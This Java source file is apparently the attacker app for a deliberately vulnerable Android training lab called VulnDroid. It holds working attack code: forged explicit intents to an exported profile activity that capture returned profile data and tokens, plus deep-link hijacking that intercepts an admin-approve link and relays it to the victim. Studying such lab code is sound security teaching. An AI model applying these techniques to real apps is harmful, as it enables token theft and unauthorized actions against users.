package com.vulndroid.attacker;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.text.TextUtils;
import android.widget.Button;
import android.widget.RadioGroup;
import android.widget.TextView;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {

    private static final String VICTIM_PROFILE =
            "com.vulndroid.app.labs.components.ProfileActivity";
    private static final String VICTIM_DEEPLINK =
            "com.vulndroid.app.labs.deeplinks.DeepLinkActivity";
    private static final String ATTACK_LINK = "vulndroid://admin/approve?txn=TXN-1042";
    private static final int REQUEST_PROFILE = 1001;

    private RadioGroup targetGroup;
    private TextView capturedView;
    private TextView logView;
    private String capturedUrl = "";
    private final StringBuilder logText = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_attacker);
        targetGroup = findViewById(R.id.attackerTargetGroup);
        capturedView = findViewById(R.id.attackerCaptured);
        logView = findViewById(R.id.attackerLog);

        findViewById(R.id.attackerLaunchProfile).setOnClickListener(v -> launchProfile());
        findViewById(R.id.attackerSendLink).setOnClickListener(v -> sendLink());
        findViewById(R.id.attackerForwardLink).setOnClickListener(v -> forwardLink());
        findViewById(R.id.attackerClear).setOnClickListener(v -> {
            logText.setLength(0);
            log("Log cleared.");
        });

        handleIncoming(getIntent());
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleIncoming(intent);
    }

    private void handleIncoming(Intent intent) {
        if (intent == null || !Intent.ACTION_VIEW.equals(intent.getAction())
                || intent.getData() == null) {
            return;
        }
        Uri uri = intent.getData();
        capturedUrl = uri.toString();
        capturedView.setText(capturedUrl);
        String scheme = uri.getScheme();
        String host = uri.getHost();
        String txn = uri.getQueryParameter("txn");
        String id = uri.getQueryParameter("id");
        log("CAPTURED DEEP LINK\n"
                + "uri=" + capturedUrl + "\n"
                + "scheme=" + scheme + " host=" + host + "\n"
                + "txn=" + (txn == null ? "-" : txn) + "  id=" + (id == null ? "-" : id)
                + "\n\nThe link was delivered to the attacker instead of the victim. "
                + "Use FORWARD to relay it.");
    }

    private String targetPackage() {
        return targetGroup.getCheckedRadioButtonId() == R.id.targetSecure
                ? "com.vulndroid.app.secure" : "com.vulndroid.app";
    }

    private void launchProfile() {
        String target = targetPackage();
        ComponentName component = new ComponentName(target, VICTIM_PROFILE);
        Intent intent = new Intent();
        intent.setComponent(component);
        intent.putExtra("user_id", 2);
        intent.putExtra("from_attacker", true);
        log("Explicit startActivityForResult\ncomponent=" + component.flattenToShortString()
                + "\nextra user_id=2");
        try {
            startActivityForResult(intent, REQUEST_PROFILE);
        } catch (SecurityException e) {
            log("BLOCKED by Android\nSecurityException: " + e.getMessage()
                    + "\n\nThe component is not exported or requires a permission the attacker lacks.");
        } catch (ActivityNotFoundException e) {
            log("TARGET NOT FOUND\n" + e.getMessage()
                    + "\n\nInstall " + target + " first.");
        } catch (Exception e) {
            log("FAILED\n" + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode != REQUEST_PROFILE) {
            return;
        }
        if (resultCode == RESULT_OK && data != null) {
            String profile = data.getStringExtra("profile");
            String token = data.getStringExtra("token");
            log("ACCESS GRANTED\nresult=RESULT_OK\nprofile="
                    + (profile == null ? "(none)" : profile)
                    + "\ntoken=" + (token == null ? "(none)" : token)
                    + "\n\nThis data crossed the app boundary through interpreter-supplied extras.");
        } else {
            log("ACCESS DENIED\nresultCode=" + resultCode
                    + "\nThe target did not return profile data.");
        }
    }

    private void sendLink() {
        Intent view = new Intent(Intent.ACTION_VIEW, Uri.parse(ATTACK_LINK));
        log("Sending implicit link:\n" + ATTACK_LINK
                + "\n\nPick VulnDroid Attacker in the chooser to capture it.");
        try {
            startActivity(Intent.createChooser(view, "Choose a link handler"));
        } catch (Exception e) {
            log("Could not send link: " + e.getClass().getSimpleName() + " — " + e.getMessage());
        }
    }

    private void forwardLink() {
        String link = TextUtils.isEmpty(capturedUrl) ? ATTACK_LINK : capturedUrl;
        String target = targetPackage();
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(link));
        intent.setComponent(new ComponentName(target, VICTIM_DEEPLINK));
        log("Forwarding captured URI to victim\nuri=" + link + "\ntarget=" + target
                + "/.labs.deeplinks.DeepLinkActivity");
        try {
            startActivity(intent);
        } catch (SecurityException e) {
            log("TARGET BLOCKED\nSecurityException: " + e.getMessage());
        } catch (ActivityNotFoundException e) {
            log("TARGET NOT FOUND\nInstall " + target + " first.");
        } catch (Exception e) {
            log("FAILED\n" + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void log(String message) {
        if (logText.length() > 0) {
            logText.append("\n\n");
        }
        String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
        logText.append("[").append(time).append("]\n").append(message);
        if (logView != null) {
            logView.setText(logText.toString());
        }
    }
}
